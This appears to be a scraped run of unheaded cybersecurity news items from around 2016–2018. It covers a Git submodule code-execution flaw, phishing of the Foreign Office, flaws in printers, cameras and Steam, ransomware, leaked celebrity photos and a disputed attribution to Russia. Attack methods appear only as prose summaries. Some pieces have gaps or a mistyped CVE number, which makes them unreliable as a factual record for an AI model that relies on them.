The vulnerability, CVE-2018-11235, was addressed and fixed in Git 2.17.1 and Git for Windows 2.17.1 (2), which were both released today. In addition, the Visual Studio Team Services (VSTS) team has blocked malicious repositories from being pushed to VSTS to ensure that Visual Studio cannot be used as a vector for transmitting malicious repositories to clients who have not yet patched their clients.
The vulnerability is caused when repositories are cloned. When cloning a repository, Git checks out the parent repository into the working directory as it prepares to clone the submodule. Then, Git realizes that it does not need to perform the clone of submodule because the submodule’s repository already exists on the disk from when it was checked in to the parent, and then was written to the working directory when the parent repository was checked out.
According to Microsoft, the problem lies in the fact that when Git repositories are cloned, there are important configuration details not obtained from the server, such as hooks, which are scripts that can be run at certain points in the Git workflow. 
The configuration is not cloned from a remote server because that would lead to a vulnerability where remote servers could provide code that would be executed on the end user’s computer. Unfortunately, with the new vulnerability, that is exactly what happens, Microsoft explained.
Because the submodule’s repository is checked in to a parent repository, it is not actually cloned. Therefore, the submodule repository can already have a hook configured. Additionally, if a user recursively cloned a malicious parent repository, it first checks out the parent, reads the submodule’s checked-in repository and prepares to write that submodule to the working directory, then it executes post-checkout hooks, Microsoft explained.
In order to eliminate this vulnerability, submodule’s folder names are examined more closely by Git clients. Now, submodule folder names can no longer contain “..” as a path segment and they cannot be symbolic links. As a result, they now will have to be within the .git repository folder instead of in the actual repository’s working directory.
According to Microsoft, Git now refuses to work with repositories that do not follow this newly specified configuration. Visual Studio Team Services and other hosting providers will also reject users from pushing repositories that do not adhere to this submodule configuration to protect clients that have not been patched yet.

The UK's Foreign Office was targeted by highly motivated and well-resourced hackers over several months in 2016. 
The BBC understands the government has investigated the previously unreported attack that began in April last year.
The UK's National Cyber Security Centre would not say whether data was stolen.
But a source told the BBC that the most sensitive Foreign Office information is not kept on the systems targeted by the hackers.
Research published on Thursday by cybersecurity firm F-Secure suggested the attack was a ""spear-phishing"" campaign, in which people were sent targeted emails in attempts to fool them into clicking a rogue link or handing over their username and password.
To do this, the attackers created a number of web addresses designed to resemble legitimate Foreign Office websites, including those used for accessing webmail.  
F-Secure does not know whether the attack was successful.
The company says the domains were created by hackers that it calls the Callisto Group, which it says is still active.
However the UK's National Cyber Security Centre (NCSC) declined to say who was behind the attack on the Foreign Office.
The targeted emails that were sent out tried to fool targets into downloading malware which was first developed for law enforcement by the Italian software company Hacking Team. 
Hacking Team's surveillance tools were previously exposed in a cyberattack, first reported in 2015. 
There is no suggestion that Hacking Team had any involvement in the attacks.
F-Secure said that the use of the software should remind governments that they ""don't have monopolies on these [surveillance] technologies"", and that once created the software can fall into the hands of hackers.
The BBC has not seen evidence conclusively identifying the origin of the attack.
A cybersecurity expert at another company, who wished to remain anonymous, found a link to information uncovered in the investigation of Russian efforts to influence the US election.
Two of the phishing domains used by the hackers were once linked to an IP address mentioned in a US government report into Grizzly Steppe.
Grizzly Steppe is the name given by the US government to efforts by ""Russian civilian and military intelligence services to compromise and exploit networks and endpoints associated with the US election"".
However, the cybersecurity expert noted that this connection between the phishing domain and Grizzly Steppe may be a coincidence, as over 300 other domains - many of them not hacking-related - were linked to the same IP address.
F-Secure told the BBC that it did notice some similarity between the Callisto Group's hacking and previous attacks that have been linked to Russia.
However, it said despite some similarities in the tactics, techniques, procedures and targets of the Callisto Group, and the Russia-linked group known as APT28, it believed the two were ""operationally"" separate.
It noted that the Callisto Group was also less ""technically capable"" than APT28.

LONDON — The U.K. agency tasked with fighting cyberthreats on Thursday announced a new process for the public disclosure of potentially sensitive software flaws, introducing a new level of transparency to its work.
The National Cyber Security Centre laid out its new procedure, called the ""Equities Process"" in a blog post that details how it makes decisions on whether to make public the discovery of new flaws.
National security operations sometimes hold back from announcing the discovery of security flaws in part because the bugs can be used to gather intelligence.
“There’s got to be a good reason not to disclose,” said Ian Levy, technical director at the NCSC.
The default position, the NCSC said, is to disclose those vulnerabilities to the public after fixes have been made. The government will only keep them confidential in rare instances, such as if there’s an overriding intelligence reason. Levy said withholding release of a bug will require high-level government sign-off.
The goal is to prevent cyberattacks like “WannaCry,” which paralyzed computer systems around the world in May 2017. The attack, which the U.S. has blamed on North Korea, wrought havoc within the U.K.’s National Health Service (NHS) by exploiting vulnerabilities in an outdated version of Microsoft Windows. WannaCry underscored the dangers of not patching or updating software.

The NCSC’s disclosure policy follows one implemented by the White House in 2017. The National Security Agency (NSA) had come under intense pressure from transparency advocates to disclose more about its work in the wake of WannaCry.
“The best defense against a cyberattack, whether it’s by criminals or nation states, is to keep your box up to date,” said Levy. “If you patch your software, a lot of the stuff that we’ve found goes away.”
The vast majority of attacks are carried out by exploiting vulnerabilities already known to the vendors of the technology in question, Levy said. Such was the case when Russian cyberoperatives hacked into British telecoms companies in 2017.
Levy said the primary goal of more transparency is to “bang the drum” about basic cybersecurity, like patching and secure network setups.

A longtime Debian developer has recommended that the Cryptkeeper Linux encryption app be removed from the distribution.
The advice came after the disclosure of a bug where the app sets the universal password “p” to decrypt any directory created with the program.
Simon McVittie, a programmer at Collabora, confirmed the findings of researcher Kirill Tkhai, who disclosed the bug Jan. 26.
McVittie said he was able to reproduce the bug in the Stretch version (Debian 9, in testing), but not in the Jessie version (Debian 8).
“I have recommended that the release team remove this package from stretch: it currently gives a false sense of security that is worse than not encrypting at all,” McVittie said in response to the original bug report.
Francesco Namuri, another Debian developer, agreed the Cryptkeeper packages should be yanked from Debian.
Tkhai’s advisory said Cryptkeeper version 0.9.5-5.1 is affected.
The problem appears when Cryptkeeper calls encfs, a command line interface for the encrypted file system.
Encfs simulates a ‘p’ keystroke but the uses it instead as a universal password.

Remember when all you had to worry about with your car is getting an oil change every 3,000 miles.
Today’s connected cars are miles ahead technologically speaking of those “dumb” vehicles, but drivers could see a bumpy ride if thieves get a hold of the data the car possesses.
The Internet of Things (IoT) has created an entirely new market in the automotive industry with connected car services that are driving new recurring revenue growth and transforming the industry.
And that trajectory is expected to continue, growing from $13.6 to top $42 billion by 2022.
Vehicles contain critical personal information such as personal contacts, registration and insurance details, financial information and even the address to the owner's home – making entry, theft and further damage even more of a possibility.
Vehicles have become an extension of one’s connected self and the technology associated with them offers substantial benefits.
With the emergence of sophisticated technology, the nature of vehicle theft has changed.
A major adversary of today’s vehicle owner is a smarter, connected and more targeted network of criminals, known as ‘Connected Vehicle Thieves’.
LoJack, provider of vehicle theft recovery and advanced fleet management solutions, shows how these New Age thieves can take advantage of the technology in vehicles.
Vehicle-enabled ransom: One growing and increasingly lucrative type of cybercrime is the use of ransomware, where inserted malware encrypts digital data and instructs a victim to pay the criminal a ransom to restore the decrypted information.
With the emergence of the connected car and vehicles being used as WiFi hot spots, vehicle-enabled ransomware is a predictable next step for hackers, exploiting this new avenue to commit digital “kidnapping”.
For example, in the near future, they could easily break into a vehicle, disable the engine and brakes, and demand bitcoin to restore the car to its functional state.
Scanner boxes as smart keys: Thieves have begun carrying scanner boxes, or devices that can exploit the electronic system utilized by key fobs.
These criminals can then unlock, and even start, a vehicle without even touching the key.
Once the key comes in close enough range to the scanner box and is compromised.
Data leading to identity theft: These days, connected cars carry more information and personal data than ever before, making identity theft a more serious threat.
Thieves are targeting your vehicle, but also the data within it, which could lead to credit card details, location information, Social Security numbers, and personal IDs like drivers’ licenses.
Once this information is obtained, it’s possible for a hacker to access any of your online accounts.

The Foreign Office has faced a sustained onslaught by cyberattackers believed to be linked to Russia.
It was among a string of military and government targets in Europe which were hit last year by a campaign of “spear-phishing”. The hackers’ method, in which messages appear to come from a trusted source but are infected with malware, were relatively sophisticated.
Sources said that the people behind the attack, Callisto Group, were probably linked to Russia although that could not be proved.

Over a hundred HP Inkjet printers have serious flaws that should be fixed, HP has warned. 
Computer and printer giant HP has flagged two critical flaws over a hundred different printer models that it says should be patched “as soon as possible”. 
Owners of numerous HP Inject models will need to install new firmware for each of the affected models from its Officejet, Deskjet, Envy, as well as its larger form business printers, including DesignJet and PageWide Pro printers. 
Multiple models from each product line are affected so customers and consumers should scroll through HP’s advisory to check whether their specific model is affected. 
Customers should also check out HP’s support pages for how to install the firmware updates, which can be done directly from the printer for web-enabled printers — mostly those released after 2010 — or via Windows or Mac computers they’re networked with. 
The bugs, which have been assigned the numbers CVE-2018-5924 and CVE-2018-5925, are rated “critical” and could allow remote code execution. 
“Two security vulnerabilities have been identified with certain HP Inkjet printers. A maliciously crafted file sent to an affected device can cause a stack or static buffer overflow, which could allow remote code execution,” HP notes in an advisory. 
The company hasn’t indicated whether the flaws are publicly known or under attack but says it was “recently made aware of a vulnerability in certain inkjet printers by a third-party researcher.”
The patches come just a few days after HP Inc announced it would soon launch its printer bug bounty, which is the world’s first and only print security bug bounty program. 
The computer maker is partnering with Australian-founded Bugcrowd to manage the program, which will validate the bug reports, and pay researchers between $500 to $10,000, depending on their severity. 
It’s one of Bugcrowd’s “private programs” so only researchers who are invited can submit bug reports.  
Printers are a soft spot for organizations because chief information security officers (CISOs) usually don’t get involved in their purchase, according to a member of HP’s security advisory board, MedSec CEO, Justine Bone.   
“CISOs are rarely involved in printing purchase decisions yet play a critical role in the overall health and security of their organization,” said Bone. “For decades, HP has made cybersecurity a priority rather than an afterthought by engineering business printers with powerful layers of protection. And in doing so, HP is helping to support the valuable role CISOs play in organizations of every size.”

A new version of Git has been emitted to ward off attempts to exploit a potential arbitrary code execution vulnerability – which can be triggered by merely cloning a malicious repository.
The security hole, CVE-2018-11235, reported by Etienne Stalmans, stems from a flaw in Git whereby sub-module names supplied by the .gitmodules file are not properly validated when appended to $GIT_DIR/modules. Including ""../"" in a name could result in directory hopping. Post-checkout hooks could then be executed, potentially causing all manner of mayhem to ensue on the victim's system.
Another vulnerability, CVE-2018-11233, describes a flaw in the processing of pathnames in Git on NTFS-based systems, allowing the reading of memory contents.
In a change from normal programming, the vulnerability appears to be cross platform.
Fear not, however, because a patch is available. The Git team released the update in 2.13.7 of the popular coding, collaboration and control tool and forward-ported it to versions 2.14.4, 2.15.2, 2.16.4 and 2.13.7.
For its part, Microsoft has urged users to download 2.17.1 (2) of Git for Windows and has blocked the malicious repositories from being pushed to Visual Studio Team Services users. The software giant has also promised a hotfix will ""shortly"" be available for its popular Visual Studio 2017 platform.
Other vendors, such as Debian, have been updating their Linux and software distributions to include the patched code and recommend that users upgrade to thwart ne'er-do-wells seeking to exploit the vulnerability.

Researchers found three vulnerabilities in Foscam connected security cameras that could enable a bad actor to gain root access knowing only the camera’s IP address.
Foscam  is urging customers to update their security cameras after researchers found three vulnerabilities in that could enable a bad actor to gain root access knowing only the camera’s IP address.
The vulnerability trifecta includes an arbitrary file-deletion bug, a shell command-injection flaw and a stack-based buffer overflow vulnerability according to the researchers at VDOO who found the flaws.
The proof-of-concept attack revolved around a process in the cameras called webService, which receives requests from servers and can be used to verify the user’s credentials, if necessary, and run the handler for the desired API command.
To launch an attack, an attacker would have to obtain the camera’s IP address or DNS name. Generally if the camera is configured so that it has direct interface to the internet, its address might be exposed to certain internet scanners.
The PoC attacker then crashed the webService process by exploiting the stack-based buffer overflow vulnerability (CVE-2018-6832).
After it crashes, the webService process automatically restarts via the watchdog daemon (which restarts important processes after they’re terminated), and during the process reload, an attacker could leverage a second flaw, the arbitrary file-deletion vulnerability (CVE-2018-6830), to delete certain critical files.
This will result in authentication bypass when the webService process reloads; so that the bad actor is able to gain administrative credentials. From there, an attacker could use the third vuln (CVE-2018-6831) to execute root commands. This bug is a shell command-injection vulnerability that requires administrator credentials.
“Since the adversary gained administrator credentials in the previous stage, he can now use this vulnerability to execute commands as the root user for privilege escalation,” researchers said.
The Internet of Things continues to post a significant problem as many connected devices lack proper security controls. The 2016 Mirai botnet attack,  which was orchestrated as a distributed denial of service attack through 300,000 vulnerable IoT  devices like webcams, routers and video recorders, showed just how big of an impact the lack of IoT security has.
The patches also come after reports of a hacked baby camera emerged last week, when a woman from South Carolina said a stranger hacked into her baby monitor to spy on her and her family. These IoT security incidents show not only that connected products are highly vulnerable to security hacks, but also that such hacks could mean a complete invasion of privacy at the most personal level.
Foscam, for its part, urged customers to upgrade their cameras as soon as possible, saying that “the latest firmware for Foscam cameras utilizes protection against various types of online hacking and unauthorized access.”
It added, “Foscam is fully committed to maintaining the safety and integrity of our user experience and will take all action reasonably necessary to ensure the privacy and security of our cameras.”

Published December 7, 2016 5:50 pm in Adobe, Adobe Flash, Malware, Ransomware, Vulnerability  0 
Of the top 10 vulnerabilities incorporated by exploit kits in 2016, six of them (rather unsurprisingly) affected Adobe Flash Player.
Real-time threat intelligence provider Recorded Future arrived at those findings by analyzing thousands of sources including information security blogs and deep web forum postings.
Recorded Future then ranked each vulnerability based upon how many web references linked the bug to at least one of 141 exploit kits, malicious software packages like Neutrino and RIG which abuse security flaws to infect users with TrickBot and other malware.
Recorded Future found the most references to CVE-2016-0189, a vulnerability affecting Internet Explorer.
More than 700 web sources linked the bug to the Magnitude, RIG, Neutrino, and Sundown exploit kits.
But when it came to actual links with exploit kits, Adobe Flash Player cleaned house.
In total, six Adobe Flash Player vulnerabilities appeared in the top 10 list.
Two of those (CVE-2016-1o1o and CVE-2015-8446) bonded with the late Angler exploit kit.
Another three (CVE-2016-1019, CVE-2016-4117, and CVE-2015-8651) connected to at least three exploit kits.
Overall, the regrettable honor of integration with the most exploit kits goes to CVE-2015-7645, a flaw which a mere 70 web sources linked to seven different packages: Neutrino, Angler, Magnitude, RIG, Nuclear Pack, Spartan, and Hunter.
Recorded Future provides some background on why this vulnerability likely received so many linkages:
""CVE-2015-7645 impacts Windows, Mac, and Linux operating systems, which makes it extremely versatile.
Per Adobe, it can be used to take control of the affected system.
Additionally, it was the first zero-day exploit discovered after Adobe introduced new security mitigations, and as such, it was quickly adopted as many other older exploits ceased working on machines with newer Flash versions.
The vulnerability was also noted as being used by Pawn Storm (APT28, Fancy Bear), a Russian government-backed espionage group.""
To protect against RIG and the others from exploiting some of these vulnerabilities on your machine, you should patch your system regularly, install a reputable anti-virus solution, and install an ad-blocker.
There's no hope when it comes to Adobe Flash Player.
It seems like new bugs are emerging every day, which makes patch management a serious headache.
If you can, you should uninstall Adobe Flash Player from your computer as soon as possible.

Real estate transactions are some of the higher value transactions performed by individuals and organizations.
They often exceed hundreds of thousands of dollars in value, and for commercial properties, millions of dollars are quite normal.
Many buyers and sellers are not familiar with what is normal when it comes to real estate transactions.
Over the last few years, we have seen this exploited in a specific form of ""Business E-Mail Compromise,"" where an attacker is injecting e-mails into conversations to trick the victim to transfer money to the wrong account.

Robots with inadequate security could be hacked and cause physical harm or be used to spy on unsuspecting owners in the near future.
Researchers at IOActive Labs released a report Wednesday warning that consumer, industrial and service robots in use today have serious security vulnerabilities making them easy targets for hackers or accidental breaches.
In a review of 10 robots, which ranged from home, business, and industrial, IOActive said the risks ranged from insecure communications, authentication issues, weak cryptography and missing authorization.
Cesar Cerrudo, CTO of IOActive Labs, said robots suffer from many of the same security shortcomings of as IoT, medical devices, smart cars and plush toys.
“We found nearly 50 cybersecurity vulnerabilities in the robot ecosystem components, many of which were common problems,” according to the IOActive Labs report.
As part of its investigation, IOActive analyzed some robot hardware as well as robot ecosystems.
Some of the robots examined included SoftBank Robotics’ NAO and Pepper robots, UBTECH Robotics’ Alpha 1S and Alpha 2 robots and Rethink Robotics’ Baxter and Sawyer robots.
Underlying issues within the robots studied for the report, Cerrudo said, included weak default configurations, a big security problem responsible for privacy breaches and DDoS attacks in other internet-connected devices.
“We found robots with insecure features that couldn’t be easily disabled or protected, as well as features with default passwords that were either difficult to change or could not be changed at all,” according to the report.
In a closer examination of the robot ecosystems, IOActive Labs said many of the robot platforms it analyzed use open source frameworks and libraries that suffer from known vulnerabilities such as cleartext communication, authentication issues, and weak authorization schemes.
“In the robotics community, it seems common to share software frameworks, libraries, operating systems, etc., for robot development and programming.
This isn’t bad if the software is secure; unfortunately, this isn’t the case here,” according to IOActive Labs.
Cerrudo said the threat of robots is unique in that many are semiautonomous and can wander and impact their immediate physical environment.
“The threat is limited today, compared to what robots will be capable of in the future,” he said.
Robot components such as microphones, cameras, network connectivity, remote control applications and mobility features that help robots navigate physical environments need better security, Cerrudo said.
“A hacked autonomous robot can move around as long as its battery continues to provide power.
This allows hackers to control an ‘insider threat’ and steal information or cause harm to nearby objects or people,” according to the report.
When asked, Cerrudo could not point to any known cases of a hacked robot causing personal harm or posing a security risk.
Nevertheless, he cited several robot-related accidents that he said demonstrate potential risks posed by a hacked robot.
In one case cited by IOActive Labs, a woman was killed in an industrial accident in 2015 in Alabama when an industrial robot restarted abruptly.
It cited additional loss of life incidents tied to robotic functions within computerized medical and military equipment.
“We aren’t aware of any robots that have been hacked.
But security of the robots we tested are very poor.
Eventually in the future, when robots are more mainstream, we expect cybercriminals will start seeing hacking robots as a way to make money,” said Lucas Apa, senior security consultant with IOActive Labs.
That timeline of mass robot adoption is still a little foggy, according to Apa.
According to market research firm IDC, worldwide spending on robots will reach $188 billion by 2020, up from $91.5 billion in 2016.
According to IDC many of those robots will include consumer, industrial, and service robots for industries such as healthcare and retail.
“The industry doesn’t appear to learn from it’s mistakes,” Cerrudo said.

When Cloquet school officials realized staff were unable to access certain files the morning of Aug 3, there may have been a certain amount of negative ""been there, done that"" feeling involved.
For the second time in three years, the school district is the target of a ransomware attack — a particularly virulent computer malware that spreads from computer to computer, locking up access to network servers and turning documents into gibberish before offering ""help"" in the form of a request for payment to provide a ""key"" to unlock the files.
Last time, in March 2016, the district had to cancel school for a day to allow technology staff time to recover from the malware, which infected some of the district's servers and many of its more than 600 computers.
This time, it happened over summer vacation, and the attack was not as devastating. According to the staff report from Cloquet School District Technology Director T.J.Smith, the virus encrypted files on all servers except one, including network shared drives. However, there is no indication that any information was ""stolen,"" just that it had been encrypted, so users were unable to open the files.
Smith explained to Cloquet School Board members Monday, Aug 13, that the district had two options, not including paying the ransom demand: either try to recover the data, which may not be successful and could be a waste of time and money, or figure out how to recreate the data and rebuild the affected servers.
He advocated the second option, noting that the lost data was not ""mission critical"" and that insurance will pay to return the servers to their previous state.
Board members voted unanimously for the second option of re-creating information and rebuilding the servers; they also voted to hire a company to do a ""forensic"" investigation to try and determine how the virus got in.
The total cost to the school district for insurance deductibles, estimated at $15,000, will be covered by money already in the technology budget.
Superintendent Michael Cary said the district determined that paying a ransom ""is not in the best interest of our schools and the community we serve.""
Board Chairman Ted Lammi said he believes such payments to hackers should be illegal.
""Some institutions have paid big bucks and that's why these guys do it,"" Lammi said.
Board member Duane Buytaert, who works in technology for Carlton County, said it can also be a matter of making sure users know how to detect such attacks.
""We all get those wacky emails,"" he said.
Staff training should be a priority, board members agreed.
On the positive side, Smith said technology staff were able to recover quite a bit of data already, and staff can recreate the data that was lost.
The recovery process should not affect the start of school Sept 5.

Earlier this week, private photos and video clip of the famous WWE Divas Lisa Marie Varon known by her WWE name Victoria and Charlotte Flair were leaked online the internet. The photos showed Charlotte taking selfies of herself in front of the mirror using her iPhone while in Lisa’s case a video clip in her private moments along with selfies taken from her iPhone have been leaked.
Her original name being Ashley Fliehr, the WWE woman wrestler is the daughter of Ric Flair, who is again a well-known wrestling legend. She is considered as one of the most popular WWE stars having been the women’s champion for up to four times. She began her career by first appearing on NXT in 2013, and after a year, she managed to win NXT Women’s Championship.
Later, she won the WWE Divas Championship after being promoted to the main roster in 2015. She had also been married twice. Her first marriage was in 2010 with Riki Johnson. They later filed for divorce and Flair then married Bram in 2013. They got divorced in 2015.
Flair also had a brother, Reid, who was found dead in March 2013, in Charlotte’s bed and it was revealed that he died from heroin overdose.
Flair tweeted about her photos being leaked saying that her photos were shared online without her consent and demanded that they should be removed immediately. Upon this, there were a plethora of supporters who emerged on Twitter, showing their support for Flair with the hashtag 
Flair, however, is not the only victim whose photos have been leaked so unscrupulously. Alexa Bliss, who currently holds the title of RAW Women’s Champion, had her photos leaked as well on April 28. Alexa tweeted that the photos are fake and demanded that they should be taken down immediately.
Similarly, Paige, who was WWE Divas Champion, had her private photos hacked along with explicit videos that were made public online. She later wrote that she felt quite bad and wanted to harm herself for days after the leak. Furthermore, private photos of WWE Divas including Maria Kanellis, Melina Perez, Kaitlyn and Summer Rae were also leaked on different online platforms.
That’s not all, it was about two months ago when hackers leaked private photos of prominent Hollywood celebrities like Amanda Seyfried, Emma Watson. However, It is quite unnerving and yet troubling to see how these WWE stars are being exploited and no attention is being paid to the security standards of mobile communication. It is vital that network operators look into the issue immediately and build proper security features to prevent such infiltrations.

Microsoft rolled out 60 patches for its Patch Tuesday release, impacting 19 critical flaws and 39 important flaws.
Microsoft has rolled out its August Patch Tuesday fixes, addressing 19 critical vulnerabilities, including fixes for two zero-day vulnerabilities that are under active attack.
Overall, the company patched a total of 60 flaws, spanning Microsoft Windows, Edge, Internet Explorer (IE), Office, .NET Framework,  ChakraCore, Exchange Server, Microsoft SQL Server and Visual Studio. Of those, 19 were critical, 39 were rated important, one was moderate and one was rated low in severity.

The patch release includes two exploited flaws, CVE-2018-8373 and CVE-2018-8414, which were previously disclosed by researchers.
The first zero-day, CVE-2018-8373, could result in remote code-execution (RCE) and grants the same privileges as a logged-in user, including administrative rights. The vulnerability exists in IE 9, 10 and 11, impacting all Windows operating systems from Server 2008 to Windows 10.
Meanwhile, CVE-2018-8414 also enables RCE with the privileges of the logged-in user, and exists on Windows 10 versions 1703 and newer, as well as Server 1709 and Server 1803.
“The two zero-day vulnerabilities are … publicly disclosed and exploited,” said Chris Goettl, director of product management, security, for Ivanti, in an email. “CVE-2018-8373 is a vulnerability that exists in the way that the scripting engine handles objects in memory in Internet Explorer. CVE-2018-8414 code-execution vulnerability exists when the Windows Shell does not properly validate file paths.”
Microsoft also issued fixes for security issues that don’t impact Windows, but the company thought they were important enough to package into its OS updates, dubbed advisories. 

Microsoft’s Patch Tuesday comes after the company found itself in hot water last month after its new update model caused stability issues for Windows operating systems and applications, particularly in July. The model irked customers so much that enterprise patching veteran Susan Bradley wrote an open letter to Microsoft executives expressing the “dissatisfaction your customers have with the updates released for Windows desktops and servers in recent months.”

Researchers from Fidelis Cybersecurity have unearthed an “interesting security issue” involving the popular messaging app Telegram.
One of the appeals of Telegram is that it has encryption options for Android and iOS, whereby it uses your contact list to prepopulate contacts inside the app. Also, when someone in your contact list signs up for Telegram, you receive a notification so you know you can contact them using the app. However, John Bambenek, threat systems manager, Fidelis Cybersecurity, revealed that the combination of these features has allowed the firm to uncover a big privacy problem.
“If a scammer signs up for Telegram and already has your phone number in their contact list, it will also notify them that you have also Telegram,” he said.
“So in addition to connecting you to your friends and contacts, the app will also connect scammers directly to you. Likewise, if you have scammers' numbers in your contact list for some reason, you will get push notifications when they join Telegram.”
What’s more, Bambenek explained that this issue didn’t occur just once or twice, and on multiple occasions Fidelis observed phone numbers associated with telemarketing scammers signed up to use Telegram.
“To complicate matters, we found no obvious way to prevent people from finding out if you are a Telegram user,” he added.
Further, Bambenek warned that it would not be difficult to come up with a way to find out if a phone number uses Telegram (or many of the other popular mobile messaging/voice applications, for that matter), highlighting the following as uses for this insight by third parties:
Intelligence agencies consider the use of such services as a ""risk factor"" when deciding on surveillance targets.
Border control officials could detect the use of such services during border crossing interviews, and conclude that the user has something to hide.
Criminals could use the knowledge that a user is on such a service to target them.
“Encrypted messaging and voice applications create a new surface area for attacks to unfold and should not be entirely trusted,” Bambenek continued. “While these apps may be a great benefit to privacy, they shouldn’t be trusted any more than unencrypted calls. These systems do protect against spoofing, but if you have unknown callers on such applications, due caution is still required.”
However, Chris Boyd, lead malware analyst at Malwarebytes, was quick to point out that all VoiP and regular chat apps have the ability for strangers to add you to their contact list, depending on security settings, adding:
“Whether people add themselves to your Telegram, Skype or even plain old Instant Messaging services, the same ground rules apply: try to ensure that they are who they say they are before revealing too much information. If in doubt, contact your associate directly using another service – just like you would if sent a ‘stranded with no money in a foreign land’ message on Facebook,” he told Infosecurity.

“It’s pretty high confidence that Fancy Bear had to be in touch with the Russian military,” Dmitri Alperovich told Forbes.
Crowdstrike’s core argument has three premises:
If all of these premises were true, then Crowdstrike’s prior claim that Fancy Bear must be affiliated with the GRU [4] would be substantially supported by this new finding.
Dmitri referred to it in the PBS interview as “DNA evidence”.
In fact, none of those premises are supported by the facts.
This article is a summary of the evidence that I’ve gathered during hours of interviews and background research with Ukrainian hackers, soldiers, and an independent analysis of the malware by CrySys Lab.
My complete findings will be presented in Washington D.C. next week on January 12th at Suits and Spooks.
Crowdstrike, along with FireEye and other cybersecurity companies, have long propagated the claim that Fancy Bear and all of its affiliated monikers (APT28, Sednit, Sofacy, Strontium, Tsar Team, Pawn Storm, etc.)
were the exclusive developers and users of X-Agent.
If both a security company and a hacker collective have the X-Agent source code, then so do others, and attribution to APT28/Fancy Bear/GRU based solely upon the presumption of “exclusive use” must be thrown out.
This doesn’t mean that the Russian government may not choose to use it.
In fact, Sean Townsend believes that the Russian security services DO use it but he also knows that they aren’t the only ones.
The first iteration of the POPR-D30 Android app designed by Ukrainian military officer Jaroslav Sherstuk (and the only iteration allegedly impacted by this malware) was a simple ballistics program that calculated corrections for humidity, atmospheric pressure, and other environmental factors that determine accuracy of the D-30 Howitzer.
The Android APK malware doesn’t use GPS nor does it ask for GPS location information from the infected phone or tablet.
That’s a surprising design flaw for custom-made malware whose alleged objective was to collect and transmit location data on Ukrainian artillery to the GRU.
It does collect base station information but that isn’t nearly sufficient for targeting purposes.
In rural areas, one base station could have a range of up to 30 kilometers (18.6 miles).
Crowdstrike’s estimate of 80% losses of the D-30 Howitzers came from one source — an article written by pro-Russian blogger Boris Rozhin, a resident of Crimea who writes for a blog called The Saker which he calls “the voice of totalitarian propaganda”
Bloomberg journalist Leonid Bershidsky pointed out that the estimates “appear to be based on an assumption that changes in military balance reports, themselves far from perfect, can be interpreted as losses.
Ukraine, a nation at war, doesn’t broadcast information about its specific capabilities”.
Pavlo Narozhnyy, a Ukraine military advisor, told VOA that “I personally know hundreds of gunmen in the war zone.
None of them told me of D-30 losses caused by hacking or any other reason”.
Even Rozhin acknowledged that his interpretation of the International Institute of Strategic Studies (IISS) data needs work: “Generally speaking, both methods have their advantages and disadvantages, as it is obvious that lost armour did not count everything destroyed, as well as that the loss of hardware (counted based on staffing standards) in some cases did not mean that it was destroyed.
For example, some hardware lost after 2013 was left in Crimea and returned to Ukraine only partially.
Some hardware could have existed only on paper and even before the war could have been non-repairable.
This suggests that the real losses of the UA still need to be further researched to make the conclusions more precise”.
While the original POPR-D30 app was available for download online, users had to contact Sherstuk personally and provide their military credentials in order to receive a code for activation.
There is no evidence that any of those users had their apps compromised by malware.
In fact, Crowdstrike hasn’t provided any evidence that the malware-infected Android app was used by even a single Ukrainian soldier.
Sherstuk himself stopped supporting the first version in 2015 [10] so how could Crowdstrike even begin to justify its claims as to the malware’s effectiveness?
Part of the evidence supporting Russian government involvement in the DNC and related hacks (including the German Bundestag and France’s TV5 Monde) stemmed from the assumption that X-Agent malware was exclusively developed and used by Fancy Bear.
We now know that’s false, and that the source code has been obtained by others outside of Russia.
The GRU, according to Crowdstrike, developed a variant of X-Agent to infect an Android mobile app in order to geolocate and destroy Ukraine’s D-30 howitzers.
To do this, they chose an artillery app which had no way to send or receive data, and wrote malware for it that didn’t ask for GPS position information?
Crowdstrike never contacted the app’s developer to inform him about their findings.
Had they performed that simple courtesy, they might have learned from Jaroslav Sherstuk how improbable, if not impossible, their theory was.
Instead, they worked inside of their own research bubble, performed no verification of infected applications or tablets used by Ukraine’s artillery corps, and extrapolated an effect of 80% losses based upon a self-proclaimed, pro-Russian propagandist and an imaginary number of infected applications.

Valve has patched a critical vulnerability in the Steam client which has lurked undetected for at least 10 years.
The vulnerability impacts all versions of the gaming platform.
Tom Court, a security researcher hailing from Context Information Security, discovered the bug and disclosed his findings on Thursday. In a blog post, the researcher said that left unpatched, the bug permits threat actors to perform remote code execution (RCE) attacks.
It was not until July last year that Valve added modern ASLR exploit protections to its Steam source code. However, this addition made sure that the vulnerability would only cause a client crash if exploited -- unless a separate information leak vulnerability was also active in the exploit chain.
 Valve's Steam software uses a custom protocol, known as the ""Steam Protocol,"" which is delivered on the top of UDP.
The protocol registers packet length and the total reassembled datagram length; however, the vulnerability was caused by a simple lack of checks to ensure that for the first packet of a fragmented datagram, the specified length was less than or equal to the total datagram length.
All an attacker needed to do was to send a malformed UDP packet to trigger the exploit.
""This means that it is possible to supply a data_len smaller than packet_len and have up to 64kb of data (due to the 2-byte width of the packet_len field) copied to a very small buffer, resulting in an exploitable heap corruption,"" Court says. ""This seems like a simple oversight, given that the check was present for all subsequent packets carrying fragments of the datagram.""
The vulnerability was reported to Valve on 20 February and was fixed in a beta release less than 12 hours later. This patch was then pushed to a stable release on 22 March.
""This was a very simple bug, made relatively straightforward to exploit due to a lack of modern exploit protections,"" Court says. ""The vulnerable code was probably very old, but as it was otherwise in good working order, the developers likely saw no reason to go near it or update their build scripts.""
""The lesson here is that as a developer it is important to periodically include aging code and build systems in your reviews to ensure they conform to modern security standards, even if the actual functionality of the code has remained unchanged,"" the researcher added.

Adobe has patched 87 vulnerabilities for Acrobat and Reader in its December Patch Tuesday update, including a slew of critical flaws that would allow arbitrary code-execution.
The scheduled update comes less than a week after Adobe released several out-of-band fixes for Flash Player, including a critical vulnerability (CVE-2018-15982) that it said is being exploited in the wild. That’s a use-after-free flaw enabling arbitrary code-execution in Flash.

The addressed critical vulnerabilities are myriad this month. The arbitrary code-execution problems include: two buffer errors; two untrusted pointer dereference glitches; three heap-overflow issues, five out-of-bounds write flaws, 24 use-after-free bugs. Adobe also patched three other critical-rated issues that could lead to privilege escalation; these are all security bypass problems.

In addition to the critical bugs, Adobe also patched 43 out-of-bounds read flaws, four integer overflow problems and two security bypass issues, all of which could allow information disclosure.
Adobe has characterized all of the flaws, both critical and important, as “priority two” for patching, which means that the software giant deems them to be unlikely to be imminently exploited in the wild, but patching within 30 days is recommended.
